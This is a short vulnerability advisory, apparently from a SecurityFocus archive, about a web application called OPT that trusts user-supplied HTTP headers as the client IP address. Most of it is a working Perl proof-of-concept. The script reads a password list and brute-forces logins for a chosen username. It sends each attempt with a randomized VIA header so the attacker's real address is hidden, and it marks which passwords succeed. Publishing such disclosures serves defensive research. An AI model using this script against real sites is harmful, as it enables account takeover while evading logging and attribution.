source: http://www.securityfocus.com/bid/6630/info

It has been reported that OPT accepts the values supplied supplied by users in HTTP headers as the originating IP address of a request. It is possible for a remote host to supply a fake IP address in one of these environment variables that would obscure the origin on the request.

#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request::Common;
use HTTP::Response;
my ($url,$uid,$pf) = @ARGV;
open(P,"< $pf") || die "passf.?\n";
my $ua = LWP::UserAgent->new(requests_redirectable => ['POST']); # carefully !
while(<P>){ my $pwd = $_; chomp($pwd);
my %h = ( VIA => (rand(255)%255).".".(rand(255)%255).".".(rand(255)%255).".".(rand(255)%255) );
my $res = $ua->request(HEAD "$url?lang=0&justlogged=1&username=$uid&password=$pwd&tz=+0200&button=Login now",%h);
my $hds = $res->headers; my $new = $hds->header("Location");
my $res2 = $ua->request(GET "$new",%h); my $res2 = $ua->request(GET "$new",%h); # strange db-redirect stuff ?!!
my $cod = $res2->code;
my $pag = $res2->content;
print "$uid:$pwd ".(($cod =~ /20\d/ && $pag !~ /is invalid/ig)?"\tYES":'')."\n"; }
close (P);